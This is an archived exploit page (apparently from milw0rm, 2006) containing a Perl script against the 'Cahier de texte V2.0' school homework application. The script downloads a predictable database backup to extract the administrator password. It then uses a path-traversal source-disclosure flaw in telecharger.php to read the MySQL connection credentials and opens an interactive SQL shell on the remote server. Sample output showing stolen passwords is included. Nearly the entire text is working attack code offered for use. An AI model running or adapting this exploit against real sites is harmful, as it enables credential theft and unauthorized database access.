<html><head><title>Cahier de texte 2.0 (Database Backup/Source Disclosure) Remote Exploit</title></head><pre>#!/usr/bin/perl
#
#
# INFORMATIONS
# ============
# Affected.scr..: Cahier de texte V2.0
# Poc.ID........: 15061124
# Type..........: Predictable backup filename, Source disclosure
# Risk.level....: High
# Conditions....: register_globals = on
# Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/
# Poc.link......: acid-root.new.fr/poc/15061124.txt
# Credits.......: DarkFig
# Note..........: Coded for fun
#
#
# SCREENSHOT
# ==========
# header&gt; Cahier de texte V2.0 SQL Code Execution Exploit
# header&gt; -----------------------------------------------
# status&gt; Searching the backup file
# sploit&gt; Administrateur::epolas
# status&gt; Downloading database informations
# sploit&gt; Host::sql.mysite.com
# sploit&gt; Database::cahier_de_texte
# sploit&gt; Username::root
# sploit&gt; Password::toor
# status&gt; Contacting the mysql server
# _mysql&gt; select * from cdt_prof
# +-------+--------------+---------+
# |ID_prof|nom_prof      |passe    |
# +-------+--------------+---------+
# |      1|Administrateur|epolas   |
# |      2|DarkFig       |crazypass|
# +-------+--------------+---------+
# 2 rows processed
#
# _mysql&gt; exit
#
use MySQL;
use Getopt::Long;
use LWP::UserAgent;
use HTTP::Response;
use HTTP::Request::Common;

print STDOUT &quot;\nheader&gt; Cahier de texte V2.0 SQL Code Execution Exploit&quot;;
print STDOUT &quot;\nheader&gt; &quot;, &quot;-&quot; x 47, &quot;\n&quot;;

$opt = GetOptions(
         'host=s'   =&gt;  \$host,
         'path=s'   =&gt;  \$path,
         'proxh=s'  =&gt;  \$proxh,
         'proxu=s'  =&gt;  \$proxu,
         'proxp=s'  =&gt;  \$proxp);

if(!$host) {
    print STDOUT &quot;header&gt; Usage: ./xXx.pl --host=[www] --path=[/] [Opts]\n&quot;;
    print STDOUT &quot;header&gt; [Opts] --proxh=[ip] --proxu=[user] --proxp=[pwd]\n&quot;;
    exit(1);
}

$host = $host !~ /^http:\/\// ? &quot;http://$host&quot; : $host;
$path = defined($path) ? $path : &quot;/&quot;;

$ua = LWP::UserAgent-&gt;new();
$ua-&gt;agent('0xzilla');
$ua-&gt;timeout(30);
$ua-&gt;proxy(['http'] =&gt; $proxh) if $proxh;
$re-&gt;proxy_authorization_basic($proxu, $proxp) if $proxp;

# First vulnerability
# ===================
# The backup's filename is allways the same
# If the file is protected by a .htaccess file,
# use the source disclosure vulnerability to get it.
# There is also all members passwords but here we
# just take the administrator password.

print STDOUT &quot;status&gt; Searching the backup file\n&quot;;
$re  = GET $host.$path.'administration/dump.sql';
$res = $ua-&gt;request($re);

if($res-&gt;as_string !~ /HTTP\/1.(x|1) 404 Not Found/) {
if($res-&gt;content =~ /INSERT INTO cdt_prof VALUES\(1, 'Administrateur', '(.*?)'\);/) {
print STDOUT &quot;sploit&gt; Administrateur::$1\n&quot;;}} else {
print STDOUT &quot;sploit&gt; None backup found\n&quot;;}

# Second vulnerability
# ====================
# Source disclosure in administration/telecharger.php

print STDOUT &quot;status&gt; Downloading database informations\n&quot;;
$ch  = '../Connections/conn_cahier_de_texte.php&amp;Fichier_a_telecharger=';
$re  = GET $host.$path.&quot;administration/telecharger.php?chemin=$ch&quot;;
$res = ($ua-&gt;request($re))-&gt;content;

if($res =~  /\$hostname_conn_cahier_de_texte([\s]*)=([\s]*)&quot;(.*?)&quot;;([\s]*)(||
            )\$database_conn_cahier_de_texte([\s]*)=([\s]*)&quot;(.*?)&quot;;([\s]*)(||
            )\$username_conn_cahier_de_texte([\s]*)=([\s]*)&quot;(.*?)&quot;;([\s]*)(||
            )\$password_conn_cahier_de_texte([\s]*)=([\s]*)&quot;(.*?)&quot;;([\s]*)/) {

$mhost=$3; $database=$8; $username=$13; $password=$18;
print STDOUT &quot;sploit&gt; Host::$mhost\nsploit&gt; Database::$database\n&quot;;
print STDOUT &quot;sploit&gt; Username::$username\nsploit&gt; Password::$password\n&quot;;} else {
print STDOUT &quot;sploit&gt; Exploit failed\n&quot;;
exit(1);}

if($mhost =~ /^(localhost|127\.0\.0\.1)$/ or !$mhost) {
print STDOUT &quot;sploit&gt; MySQL server is localhost\n&quot;;
exit(1);}

# Third step
# ==========
# Trying a connection with the MySQL server

print STDOUT &quot;status&gt; Contacting the mysql server\n&quot;;
$dbh = Mysql-&gt;connect($mhost, $database, $username, $password);
$dbh-&gt;selectdb($database);

while() {
   print STDOUT &quot;_mysql&gt; &quot;;
   chomp($query = &lt;STDIN&gt;);

   $query =~ /^(exit||quit)$/   ? exit(0)               : 0x2727;
   $res   = $dbh-&gt;query($query) ? $dbh-&gt;query($query)   : $dbh-&gt;errmsg();
   $res  != $dbh-&gt;errmsg()      ? print $res-&gt;as_string : 0x2727;
}

# milw0rm.com [2006-11-24]</pre></html>